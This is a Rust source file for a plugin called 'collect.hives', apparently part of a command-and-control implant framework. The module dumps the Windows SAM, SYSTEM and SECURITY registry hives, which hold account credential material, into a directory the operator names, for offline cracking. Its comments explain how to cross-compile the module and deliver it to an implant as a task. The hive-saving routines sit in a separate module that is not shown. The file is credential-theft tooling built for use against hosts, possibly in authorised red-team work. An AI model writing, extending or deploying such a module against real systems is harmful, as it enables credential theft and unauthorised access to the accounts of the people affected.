//! The credential collection family's first module (architecture.md
//! Sec 5.4): `collect.hives`, the account hives -- one discrete
//! collection technique whose halves stay honest about what the act
//! is: the verb that saves a dump is the readiness read that says
//! whether the save can run, and both ride the task audit every
//! dispatched action already enters.
//!
//! The grammar gives one verb two actions -- `save` writes the SAM,
//! SYSTEM, and SECURITY hives into the task-named directory under the
//! backup privilege, `list` reports the readiness facts (the default:
//! a bare task is a read). The save needs the administrator's
//! privilege, and the refusal names elevation rather than pretending
//! the save ran. The offline cracking the dumps feed is the
//! engagement's business, not the module's: what ships is the dump
//! and the honest row that says where it landed -- three on-disk
//! files carrying account material, sitting in the named directory
//! until the operator pulls and deletes them.
//!
//! Build for a Windows target (`cargo build --release --target
//! x86_64-pc-windows-gnu`), deliver the cdylib's bytes as a
//! `module.load hives` task's content, then task `collect.hives` like
//! any compiled verb. A non-Windows build compiles for the lane and
//! refuses the verb at run time: the technique has no hive to save
//! there.

mod arguments;
mod hives;

use arguments::Arguments;
use rod_plugin_sdk::{rod_plugin, Plugin, Verb};

// The action the Windows dispatch matches on; off Windows the verb
// refuses before the name is ever spoken, and an unused import would be
// a build warning the lane turns into a failure.
#[cfg(windows)]
use arguments::Action;

pub struct Hives;

impl Plugin for Hives {
    fn name(&self) -> &'static str {
        "hives"
    }

    fn verbs(&self) -> Vec<Verb> {
        vec![Verb::new("collect.hives", hives_verb)]
    }
}

fn hives_verb(input: &str) -> Result<String, String> {
    let arguments = arguments::parse(input)?;
    arguments::validate(&arguments)?;
    execute(&arguments)
}

/// The Windows execution: the action the task named against the
/// account hives.
#[cfg(windows)]
fn execute(arguments: &Arguments) -> Result<String, String> {
    match arguments.action {
        Action::Save => save(arguments),
        Action::List => list(),
    }
}

/// The technique has no hive off Windows; the manifest's targets keep
/// the module off other loads, and this refusal keeps a stray dispatch
/// honest about why it cannot run.
#[cfg(not(windows))]
fn execute(_arguments: &Arguments) -> Result<String, String> {
    Err(format!(
        "collect.hives: account hives are a Windows technique; this \
         build runs on {}",
        std::env::consts::OS
    ))
}

#[cfg(windows)]
fn save(arguments: &Arguments) -> Result<String, String> {
    let directory = arguments.directory.as_deref().unwrap_or_default();
    // The privilege first, so an unelevated implant refuses once,
    // named, before any hive is touched.
    if let Err(status) = hives::backup_privilege() {
        return Err(format!("collect.hives: {}", hives::status_message(status)));
    }
    Ok(hives::save_all(directory).join("\n"))
}

/// The readiness read: the privilege in hand or not, then each source
/// hive in place or not -- the facts a save would run on, reported in
/// the table's order so two reads of one host compare line by line.
#[cfg(windows)]
fn list() -> Result<String, String> {
    let system = hives::system_directory();
    let privilege = match hives::backup_privilege() {
        Ok(()) => "held by this process -- the save can run".to_string(),
        Err(_) => "absent -- the save needs an elevated implant".to_string(),
    };
    let rows: Vec<String> = std::iter::once(format!("backup privilege: {privilege}"))
        .chain(hives::HIVES.iter().map(|hive| {
            hives::status_row(
                hive,
                &system,
                hives::file_exists(&format!(r"{system}\config\{}", hive.key)),
            )
        }))
        .collect();
    Ok(rows.join("\n"))
}

rod_plugin!(Hives);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn an_empty_task_is_the_read() {
        // The default action is list: a bare task reports the
        // readiness facts and writes nothing -- on a non-Windows build
        // it refuses, naming why.
        #[cfg(windows)]
        {
            let output = hives_verb("").expect("the read runs");
            assert!(output.contains("backup privilege"), "{output}");
        }
        #[cfg(not(windows))]
        {
            let refusal = hives_verb("").expect_err("off Windows the verb refuses");
            assert!(refusal.contains("Windows technique"), "{refusal}");
            assert!(refusal.contains(std::env::consts::OS), "{refusal}");
        }
    }

    #[test]
    fn a_bad_grammar_refuses_before_anything_runs() {
        assert!(hives_verb("dump C:\\loot").is_err());
        assert!(hives_verb("save").is_err());
        assert!(hives_verb("list C:\\loot").is_err());
    }
}
